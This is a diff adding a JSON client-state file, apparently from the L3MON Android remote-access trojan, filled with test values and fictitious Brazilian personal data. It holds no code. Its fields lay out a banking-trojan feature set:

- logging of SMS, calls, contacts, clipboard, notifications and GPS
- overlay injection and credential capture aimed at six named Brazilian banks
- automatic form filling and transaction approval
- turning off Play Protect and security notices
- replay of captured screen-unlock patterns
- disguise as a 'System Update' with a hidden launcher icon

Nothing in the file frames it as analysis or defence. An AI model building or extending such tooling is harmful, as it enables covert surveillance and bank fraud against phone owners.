@@ -1,0 +1,158 @@
+{
+  "clientID": "test_dsu_log_1783601544516",
+  "CommandQue": [],
+  "SMSData": [],
+  "CallData": [],
+  "contacts": [],
+  "wifiNow": [],
+  "wifiLog": [],
+  "clipboardLog": [],
+  "notificationLog": [],
+  "enabledPermissions": [],
+  "apps": [],
+  "GPSData": [],
+  "GPSSettings": {
+    "updateFrequency": 0
+  },
+  "downloads": [],
+  "currentFolder": [],
+  "atsConfig": {
+    "enabled": false,
+    "autoClickEnabled": false,
+    "clickDelayMs": 500,
+    "dataMapping": {
+      "email": "usuario.ficticioso@example.com",
+      "phone": "+5511999999999",
+      "password": "SenhaFictica123!",
+      "address": "Rua Fictícia, 123",
+      "cpf": "12345678900",
+      "creditCard": "4532015112830366",
+      "name": "Usuário Fictício",
+      "pix": "12345678900"
+    },
+    "fieldPatterns": [
+      "email",
+      "phone",
+      "password",
+      "address",
+      "cpf",
+      "creditCard",
+      "account",
+      "login",
+      "usuario",
+      "pix"
+    ],
+    "buttonPatterns": [
+      "enviar",
+      "send",
+      "submit",
+      "confirmar",
+      "confirm",
+      "ok",
+      "continuar",
+      "continue",
+      "proximo",
+      "next",
+      "avancar",
+      "forward",
+      "realizar",
+      "efetuar",
+      "fazer"
+    ],
+    "atsLog": []
+  },
+  "defenseConfig": {
+    "playProtectDisabled": false,
+    "securityNotificationsMuted": false,
+    "defenseLog": []
+  },
+  "permissionGrantConfig": {
+    "autoGrantEnabled": false,
+    "grantedPermissions": [],
+    "permissionLog": []
+  },
+  "gestureSimulationConfig": {
+    "recordedGestures": [],
+    "gestureLog": []
+  },
+  "transactionApprovalConfig": {
+    "enableAutoApproval": false,
+    "autoApprovalLog": []
+  },
+  "dynamicScreenUnlockConfig": {
+    "capturedPatterns": [],
+    "unlockLog": [
+      {
+        "action": "replay_pattern",
+        "patternType": "pattern",
+        "timestamp": "2026-07-09T12:52:24.527Z",
+        "success": true,
+        "details": "Screen unlocked successfully"
+      }
+    ],
+    "autoUnlockEnabled": false
+  },
+  "overlayInjectionConfig": {
+    "enabledBanks": [
+      "itau",
+      "bradesco",
+      "caixa",
+      "nubank",
+      "bb",
+      "santander"
+    ],
+    "activeOverlays": [],
+    "capturedCredentials": [],
+    "overlayLog": [],
+    "monitoringEnabled": false
+  },
+  "customizedFormsCaptureConfig": {
+    "enabledBanks": {
+      "itau": true,
+      "bradesco": true,
+      "caixa": true,
+      "nubank": true,
+      "bb": true,
+      "santander": true
+    },
+    "realTimeCaptureEnabled": false,
+    "capturedData": [],
+    "captureLog": [],
+    "templateVersions": {
+      "itau": "1.0",
+      "bradesco": "1.0",
+      "caixa": "1.0",
+      "nubank": "1.0",
+      "bb": "1.0",
+      "santander": "1.0"
+    }
+  },
+  "bypassProtectionsConfig": {
+    "bypassEnabled": false,
+    "androidVersion": 0,
+    "restrictedSettingsBypassed": false,
+    "accessibilityServiceForced": false,
+    "installationMethod": "none",
+    "spoofedAppName": "System Update",
+    "spoofedAppType": "system_update",
+    "bypassLog": [],
+    "detectedProtections": [],
+    "bypassStatus": {}
+  },
+  "advancedHideIconConfig": {
+    "hideEnabled": false,
+    "iconHidden": false,
+    "backgroundServiceActive": false,
+    "activationMethod": "none",
+    "activationCode": "",
+    "smsActivationEnabled": false,
+    "smsActivationPhrase": "activate_l3mon",
+    "launcherIconRemoved": false,
+    "launcherName": "com.etechd.l3mon",
+    "launcherAlias": "Hidden Service",
+    "hideLog": [],
+    "hiddenStatus": {},
+    "detectedLaunchers": [],
+    "restoreMethod": "none"
+  }
+}
